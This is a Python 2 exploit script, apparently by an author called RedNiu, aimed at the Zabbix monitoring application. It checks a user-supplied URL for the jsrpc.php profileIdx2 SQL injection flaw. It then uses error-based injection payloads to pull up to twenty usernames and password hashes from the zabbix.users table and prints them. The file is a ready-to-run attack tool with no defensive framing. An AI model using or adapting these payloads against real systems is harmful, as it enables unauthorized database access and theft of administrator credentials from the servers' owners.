#-*- coding:utf-8 -*-
#@Author:RedNiu

import urllib
import urllib2
import requests
import BeautifulSoup


def ZabbixTest(Zabbix_url):
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 6.1;WOW64) AppleWebkit/537.36 (KHTML,like Gecko) Chrome/27.0.1453.94 Safari/537.36"
    }
    try:
        content=urllib.urlopen(Zabbix_url)
        if content.getcode()==200:
            try:
                ZabbixTest_url=Zabbix_url+"jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
                r=requests.get(ZabbixTest_url,headers=headers)
                if r.text.find("ed733b8d10be225eceba344d533586") == -1:
                    print "Maybe this url is not vulnerable!"
                else:
                    for i in range(0,20):
                        Findlly_url = Zabbix_url+"/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1%20AND%20(SELECT%20123%20FROM(SELECT%20COUNT(*),CONCAT(0x716a717a71,(SELECT%20MID((IFNULL(CAST(concat(alias,0x7e,passwd,0x7e)%20AS%20CHAR),0x20)),1,54)%20FROM%20zabbix.users%20ORDER%20BY%20name%20LIMIT%20"+"%s" % i+",1),0x717a6b7a71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
                        requests_content=urllib2.urlopen(Findlly_url)
                        html_content=requests_content.read()
                        soup=BeautifulSoup.BeautifulSoup(html_content)
                        sqlerror=soup.findAll(attrs={"class":"error"})
                        admin_password=str(sqlerror).split("Duplicate entry \'qjqzq")[1].split("~qzkzq1")[0].split("~")
                        print "第%d个用户：" % (i+1)+admin_password[0]+"\n密码为："+admin_password[1]
            except:
                pass
        else:
            print "Maybe this url is not zabbix page!"
    except:
            print "Maybe this url is not find!"

if __name__=='__main__':
    Zabbix_url = raw_input("请输入待检测的URL(For example:http://www.xxxx.com/)：")
    ZabbixTest(Zabbix_url)